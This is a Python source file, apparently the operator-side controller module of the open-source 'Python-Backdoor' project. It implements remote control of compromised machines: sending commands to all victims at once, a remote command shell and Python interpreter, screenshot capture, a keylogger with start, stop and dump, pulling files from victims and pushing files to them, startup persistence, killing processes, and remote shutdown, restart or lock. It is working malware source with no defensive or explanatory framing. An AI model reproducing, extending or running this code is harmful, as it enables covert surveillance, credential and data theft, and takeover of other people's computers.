"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox
"""
import time

from src import errors, helper
from src.defs import *


class Control:
    def __init__(self, socket):
        self.socket = socket

    def list_connections(self):
        self.socket.refresh()
        self.socket.list()

    def send_command_all(self, command):
        self.socket.refresh()
        self.socket.send_all_connections(CLIENT_RUN_CMD, command, True)

    def interact(self, index):
        try:
            self.socket.select(index)
            print(f"Connected to {self.socket.conn_info}")
            return True
        except errors.ServerSocket.InvalidIndex as e:
            print(e)
            return False

    def close_all(self):
        self.socket.refresh()
        self.socket.close_clients()

    def user_info(self):
        for index, text in enumerate(["IP: ", "PC Name: ", "OS: ", "User: "]):
            print(text + self.socket.conn_info[index])

    def startup(self, remove=False):
        if remove:
            self.socket.send_json(CLIENT_RMV_STARTUP)
        else:
            self.socket.send_json(CLIENT_ADD_STARTUP)

        rsp = self.socket.recv_json()

        if rsp["key"] == ERROR:
            print(rsp["value"])
        elif rsp["key"] == SUCCESS:
            print("OK.")

    def command_shell(self, index=-1):
        if index != -1:
            try:
                self.socket.select(index)
                print(f"Connected to {self.socket.conn_info}")
            except errors.ServerSocket.InvalidIndex as e:
                print(e)
                return

        self.socket.send_json(CLIENT_SHELL)

        init = self.socket.recv_json()

        if init["key"] == SERVER_SHELL_DIR:
            prompt = f"{init['value']}>"
        else:
            prompt = ">"

        while True:
            print(prompt, end="")

            command = input()

            if command.lower() in ["exit", "exit()"]:
                self.socket.send_json(CLIENT_SHELL_LEAVE)
                break

            elif len(command) > 0:
                self.socket.send_json(CLIENT_SHELL_CMD, command)

                rsp = self.socket.recv_json()

                if rsp["key"] == SERVER_COMMAND_RSP:
                    data = self.socket.recvall(rsp["value"])

                    print(data.decode())
                elif rsp["key"] == SERVER_SHELL_DIR:
                    prompt = f"{rsp['value']}>"
            else:
                print(prompt, end="")

    def python_interpreter(self):
        self.socket.send_json(CLIENT_PYTHON_INTERPRETER)

        while True:
            command = input("\n>>> ")
            if command.strip() == "":
                continue
            if command.lower() in ["exit", "exit()"]:
                break

            self.socket.send_json(CLIENT_PYTHON_INTERPRETER_CMD, command)

            rsp = self.socket.recv_json()

            if rsp["key"] == SERVER_PYTHON_INTERPRETER_RSP:
                data = self.socket.recvall(rsp["value"]).decode("utf-8").rstrip("\n")

                if data != "":
                    print(data)

        self.socket.send_json(CLIENT_PYTHON_INTERPRETER_LEAVE)

    def screenshot(self):
        self.socket.send_json(CLIENT_SCREENSHOT)

        rsp = self.socket.recv_json()

        if rsp["key"] == SERVER_SCREENSHOT:
            buffer = rsp["value"]

            print(f"\nReceiving Screenshot\nFile size: {buffer} bytes\n")

            data = self.socket.recvall(buffer)

            file = time.strftime("%Y%m%d%H%M%S.png")

            with open(file, "wb") as objPic:
                objPic.write(data)

            print(f"Done!\nTotal bytes received: {os.path.getsize(file)} bytes")

    def keylogger_start(self):
        self.socket.send_json(CLIENT_KEYLOG_START)
        print("OK.")

    def keylogger_stop(self):
        self.socket.send_json(CLIENT_KEYLOG_STOP)

        rsp = self.socket.recv_json()

        if rsp["key"] == ERROR:
            print(rsp["value"])
        elif rsp["key"] == SUCCESS:
            print("OK.")

    def keylogger_dump(self):
        self.socket.send_json(CLIENT_KEYLOG_DUMP)

        rsp = self.socket.recv_json()

        if rsp["key"] == ERROR:
            print(rsp["value"])
        elif rsp["key"] == SUCCESS:
            print(self.socket.recvall(rsp["value"]).decode() + "\n")

    def receive_file(self):
        file = helper.remove_quotes(input("\nTarget file: "))
        out_file = helper.remove_quotes(input("\nOutput File: "))

        if file == "" or out_file == "":  # if the user left an input blank
            return

        self.socket.send_json(CLIENT_RECV_FILE, file)

        rsp = self.socket.recv_json()

        if rsp["key"] == SERVER_FILE_RECV:
            print(f"File size: {rsp['value']} bytes")

            file_data = self.socket.recvall(rsp["value"])

            try:
                with open(out_file, "wb") as _file:
                    _file.write(file_data)
            except Exception as e:
                print(f"Error writing to file {e}")
                return

            print(f"Done!\nTotal bytes received: {os.path.getsize(out_file)} bytes")

        elif rsp["key"] == ERROR:
            print(rsp["value"])

    def send_file(self):
        file = helper.remove_quotes(input("\nFile to send: "))

        if not os.path.isfile(file):
            print(f"File {file} not found")
            return

        out_file = helper.remove_quotes(input("\nOutput File: "))

        if out_file == "":  # if the input is blank
            return

        with open(file, "rb") as _file:
            self.socket.sendall_json(CLIENT_UPLOAD_FILE, _file.read(), is_bytes=True)

        rsp = self.socket.recv_json()

        if rsp["key"] == SUCCESS:
            print("OK.")
        elif rsp["key"] == ERROR:
            print(rsp["value"])

    def message(self, message):
        self.socket.send_json(CLIENT_MSG, message)
        print("OK.")

    def disable_process(self, process):
        self.socket.send_json(CLIENT_DISABLE_PROCESS, process)
        print("OK.")

    def shutdown(self):
        self.socket.send_json(CLIENT_SHUTDOWN)
        print("OK.")

    def restart(self):
        self.socket.send_json(CLIENT_RESTART)
        print("OK.")

    def lock(self):
        self.socket.send_json(CLIENT_LOCK)
        print("OK. ")